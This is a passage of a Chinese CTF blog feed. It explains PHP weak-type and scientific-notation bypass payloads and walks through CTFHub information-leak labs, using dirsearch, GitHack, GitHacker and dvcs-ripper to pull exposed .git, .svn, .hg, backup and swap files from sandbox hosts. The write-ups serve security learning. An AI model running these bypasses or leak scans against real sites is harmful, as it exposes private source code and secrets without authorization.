class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: message=&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="15-科学计数法绕过"><a href="#15-科学计数法绕过" class="headerlink" title="15.科学计数法绕过"></a>15.科学计数法绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;login&quot;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;[a-zA-Z0-9]&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>]) &lt; <span class="number">10</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>] &gt; <span class="number">987654321</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>], <span class="string">&#x27;#BIG#&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$_POST</span>[<span class="string">&#x27;yingzi&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations! FLAG is : &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计：</p><p>1.isset函数，POST传入参数login和yingzi。<br>2.strlen函数，参数yingzi的值长度小于10，且数值大于987654321。<br>3.strpos函数，参数yingzi的值是否匹配<code>#BIG#</code>，如果有，则包含一个flag.php文件，输出flag。</p><p>使用科学计数法绕过strlen函数，令yingzi=e9，此时strlen=3，为了匹配<code>#BIG#</code>，所以yingzi=1e9#BIG#</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: login=<span class="number">1</span>&amp;yingzi=<span class="number">1e9</span><span class="comment">#BIG#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201120107109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP弱类型绕过方法&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="代码审计" scheme="https://swhat.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-Web-信息泄露练习</title>
    <link href="https://swhat.github.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/10/24/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-24T15:55:23.000Z</published>
    <updated>2021-04-04T14:02:30.030Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（一）</p> <a id="more"></a><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201025170908376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20201025170931536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点进去发现都有四个子文件，既然题目是目录遍历，那我就一个个点进去看，最后在4/4目录下发现了flag.txt<br><img src="https://img-blog.csdnimg.cn/20201025171354476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开获得flag<br><img src="https://img-blog.csdnimg.cn/20201025171411952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>访问网址，点击绿色按钮<br><img src="https://img-blog.csdnimg.cn/20201024125404176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现是phpinfo.php<img src="https://img-blog.csdnimg.cn/20201024125428811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>按ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201024125524903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>访问网址<br><img src="https://img-blog.csdnimg.cn/20201025171840554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>使用 dirsearch扫描，发现了可疑文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u http://challenge-4f306ca5f548ac6b.sandbox.ctfhub.com:<span class="number">10080</span>/ -e*</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025172527172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问该文件，自动下载了一个压缩包，解压看到flag文档，结果。。。。。。<br><img src="https://img-blog.csdnimg.cn/20201025172829492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接在浏览器上访问flag文档<br><img src="https://img-blog.csdnimg.cn/20201025173027426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p><img src="https://img-blog.csdnimg.cn/20201025173722285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一般备份文件的格式后缀为<code>.bak</code>，因此访问<code>url+/index.php.bak</code>，会自动下载一个文件，打开该文件，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201025173839200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br> <em>常见备份文件的后缀</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.<span class="built_in">zip</span></span><br><span class="line"><span class="number">.7</span>z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br><span class="line">linux中可能以<span class="string">&quot; ~ &quot;</span> 结尾</span><br></pre></td></tr></table></figure><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>题目描述：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br><img src="https://img-blog.csdnimg.cn/20201025175348418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>百度了解一下什么是 <code>vim缓存</code></p><blockquote><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.<br>网页后面输入.index.php.swp才能获取到index.php的备份文件</p></blockquote><p>访问<code>url/+.index.php.swp</code>下载文件，用记事本打开，在文档底部找到flag<br><img src="https://img-blog.csdnimg.cn/20201025175508624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>题目描述：<br>DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20201118202642955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接访问<code>.DS_Store</code>文件，自动下载文件，在kali中使用命令<code>cat DS_Store</code><br><img src="https://img-blog.csdnimg.cn/20201118203036832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问d18ec35f05a6922cc5c842f7b6706243.txt文件<br><img src="https://img-blog.csdnimg.cn/20201118203317871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p><strong>安装 Git</strong></p><p>1 .点击Git-2.18.0-32-bit.exe进行安装，选择安装路径。<br><img src="https://img-blog.csdnimg.cn/20201024183656934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_c3doYXQ=,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>2 . 点击“Next”按钮<br><img src="https://img-blog.csdnimg.cn/20201024183722145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 .Next，在启动文件夹页面中，默认即可。<br><img src="https://img-blog.csdnimg.cn/20201024183744151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4 .Next，在为 Git 选择默认编辑器的页面中，可以选择一个在 Windows系统中使用较为方便的编辑器。</p><p>5 .Next，在将 Git 添加到环境变量的页面中，选择第二项。可以将 Git 自动添加到环境变量，可以方便地使用 Windows 控制台执行 Git 相关的命令。<br><img src="https://img-blog.csdnimg.cn/20201024183816454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>6 .后面的页面一路next，就可以完成 Git的安装。</p><p><strong>初始化 Git</strong></p><blockquote><p>注意：在配置 Git 用户名和邮箱时，推荐使用在 CodeCode 注册的用户名和邮箱。</p></blockquote><p>1  . 在 Git 中配置 CodeCode 用户名。<br>打开cmd，输入命令。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>2 . 在 Git 中配置邮箱。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&#x27;xxx@qq.com&#x27;</span></span><br></pre></td></tr></table></figure><p>3 . 查看已配置的用户信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --<span class="built_in">list</span></span><br></pre></td></tr></table></figure><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p> 使用githack工具处理git泄露情况，打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py http:<span class="comment">//challenge-097036b10ed011a0.sandbox.ctfhub.com:10080/.git/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024204243631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还原后的文件在 <code>dist</code> 目录下<br><img src="https://img-blog.csdnimg.cn/20201024204611326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>应该有隐藏文件夹，鼠标右键打开git命令窗口，执行<code>ls  -a</code>，发现了隐藏文件夹<code>.git</code><br><img src="https://img-blog.csdnimg.cn/20201024204803631.png#pic_center" alt="在这里插入图片描述"><br>然后<code> cd .git</code>进入.git目录,再执行<code>ls -a</code>，发现了<code>..文件</code><br><img src="https://img-blog.csdnimg.cn/2020102420502298.png#pic_center" alt="在这里插入图片描述"><br>执行<code>cd ..</code>，然后使用<code>git log</code>命令查看历史记录。最新版本 为remove flag，flag 在 add flag中<br> <img src="https://img-blog.csdnimg.cn/20201024205433523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进行比对，得到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff <span class="number">602e0165129</span>c86054756c8a1b188265377b1d334</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024205703823.png#pic_center" alt="在这里插入图片描述"></p><h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><p>打开cmd窗口，进入githack目录下，然后执行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http:<span class="comment">//challenge-5dbefbea477f1e4f.sandbox.ctfhub.com:10080/.git/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024234829723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入生成的文件夹路径后，输入： <code>git stash list</code><br><img src="https://img-blog.csdnimg.cn/2020102423493374.png#pic_center" alt="在这里插入图片描述"><br>输入 <code>git stash apply</code> 进行恢复，发现了一个文档<br><img src="https://img-blog.csdnimg.cn/20201024235041194.png#pic_center" alt="在这里插入图片描述"><br>在路径下找到文档，得到flag<br><img src="https://img-blog.csdnimg.cn/20201024235153602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>方法一：<br>和前面两题一样的操作，进入githack目录下，然后执行<code>python2 GitHack.py http://challengefbe1da739791a37e.sandbox.ctfhub.com:10080/.git/</code><br><img src="https://img-blog.csdnimg.cn/20201025122844915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>cd到生成的文件夹目录下，执行<code>git ls-files</code>命令，可以看到一个文档<br><img src="https://img-blog.csdnimg.cn/20201025122827978.png#pic_center" alt="在这里插入图片描述"><br>flag就在文档中<br><img src="https://img-blog.csdnimg.cn/20201025123137677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>kali中使用GitHacker，执行命令安装GitHacker</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clone git clone https:<span class="comment">//github.com/WangYihang/GitHacker</span></span><br></pre></td></tr></table></figure><p>进入GitHacker目录下，执行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GitHacker.py http:<span class="comment">//challenge-78aecaffb772da05.sandbox.ctfhub.com:10080/.git</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201024231829893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再GitHacker目录下会生成两个个文件夹，打开<br><img src="https://img-blog.csdnimg.cn/20201024232158129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>flag就在记事本中<br><img src="https://img-blog.csdnimg.cn/20201024232234408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>题目描述：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。<br><img src="https://img-blog.csdnimg.cn/2020111820454290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>需要用到<code>dvcs-ripper</code>这个工具</p><p>安装dvcs-ripper</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>安装依赖包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>安装失败，先执行下面的命令，再重新执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt<span class="operator">-</span><span class="keyword">get</span> <span class="keyword">update</span>  </span><br></pre></td></tr></table></figure><p>dvcs-ripper工具用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-git.pl -v -u http://challenge-bd3813f36ed0e21c.sandbox.ctfhub.com:<span class="number">10080</span>/.svn/</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175105515.png" alt="在这里插入图片描述"><br>查看目录结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="operator">-</span>al</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175222664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.svn/pristine/目录，查看文件信息，看到可疑文件84<br><img src="https://img-blog.csdnimg.cn/20210127175318256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入84文件，查看文件里面的内容即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210127175403327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>题目描述:当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><p>使用<code>dvcs-ripper</code>工具</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="operator">/</span>rip<span class="operator">-</span>hg.pl <span class="operator">-</span>v <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>challenge<span class="number">-05407</span>d8a0c1ffb04.sandbox.ctfhub.com:<span class="number">10080</span><span class="operator">/</span>.hg<span class="operator">/</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210127175822781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入.hg/store/目录，查看文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180159395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看fncache文件信息<br><img src="https://img-blog.csdnimg.cn/20210127180229796.png" alt="在这里插入图片描述"><br>未看到flag_1711932515.txt信息<br><img src="https://img-blog.csdnimg.cn/20210127180244399.png" alt="在这里插入图片描述"><br>直接浏览器访问flag_1711932515.txt，即可得到flag<br><img 